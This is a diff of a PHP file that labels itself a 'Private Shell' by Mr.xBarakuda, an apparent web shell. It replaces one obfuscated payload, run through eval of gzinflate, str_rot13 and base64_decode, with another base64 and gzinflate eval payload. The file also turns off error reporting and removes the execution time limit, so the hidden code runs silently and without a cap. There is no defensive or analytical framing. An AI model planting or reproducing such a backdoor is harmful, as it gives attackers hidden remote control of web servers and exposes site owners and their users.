@@ -1,10 +1,10 @@
 <?php
-################################
-#  Private Shell Mr.xBarakuda  #
-################################
+///////////////////////////////////
+//  Private Shell Mr.xBarakuda  //
+/////////////////////////////////
 session_start();
 error_reporting(0);
 set_time_limit(0);
 date_default_timezone_set('Asia/Jakarta');
-eval(gzinflate(str_rot13(gzinflate(base64_decode("AfAAD/8NwcllgjAAANB/8VGHgywFZ21FFk6Bslfl4gSyoCUiVQjy9e17dQKtQJbbA7dgUcJ4HK5QN8qqQ4EX0j+vENUdUcJ3X7vQ7Dx+2EwxYO2PDvzSlcMhscX4tUw7d5A0nOJwgo8So9BHlzaC/tk7We1J3v6Swe7p7BqG77jICY5uYOMntR626Jg3f+I6kypekTp93vP5zXHlQeU6+tYX3xlYLelPBirx0ica4fIOwvTU6I299BeyoSUmkqS4lgXuydst4Cb2z3YdRaUwVcaZnXhss8+zYUmDMGIuU7OOs356lN4pQWRHeWIKxtxNffz7+gM=")))));
+eval(gzinflate(base64_decode('DcFLcoIwAADQ40inC0NhDEynCwoFUSIQ8cfGiRiMNPxCAOH07Xt0IFx5zM8q50RSpZPiKmqpasqNdHSlX+80q+9UWZy6VxjXaPR8h1UzMsSBOUXkWlsZIny0SX6wBluPCMIDljLBZ2h2xgzeGRCr+Bi3hWvkfXmZug52M01GLTFgCir6WsrQlOhRg+IEgwBHUO+jkFv0e+t/mMKwXSbF7xYGZC3VM9dGe+M5oc+DsIV6iGR6A+tl0Ts7vnkIS20cnGhusQRPb2Lt1DZ9iuqSeOwy1Xhf3nB81lMw70aLc20STbW7A7/q5XiIUMbhT6maJmxi03mdgudxDfYiCCo1U/OYZV+Lt3+ffw==')));
 ?>
